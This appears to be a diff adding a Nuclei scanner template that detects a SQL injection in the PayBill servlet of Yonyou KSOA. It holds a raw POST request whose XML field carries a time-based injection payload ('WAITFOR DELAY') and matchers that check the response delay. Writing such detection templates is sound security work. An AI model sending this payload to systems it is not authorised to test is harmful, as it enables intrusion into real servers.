@@ -1,0 +1,38 @@
+id: ksoa-paybill-sql-injection
+info:
+  name: 用友时空 KSOA PayBill SQL 注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="UTF-8" ?>
+        <root>
+          <name>1</name>
+          <name>1'WAITFOR DELAY '00:00:05';--</name>
+          <name>1</name>
+          <name>102360</name>
+        </root>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > 5"
+      - type: word
+        part: body
+        words:
+          - "102360"
+          - "<errmsg>"
+      - type: word
+        part: header
+        words:
+          - "text/xml;charset=UTF-8"
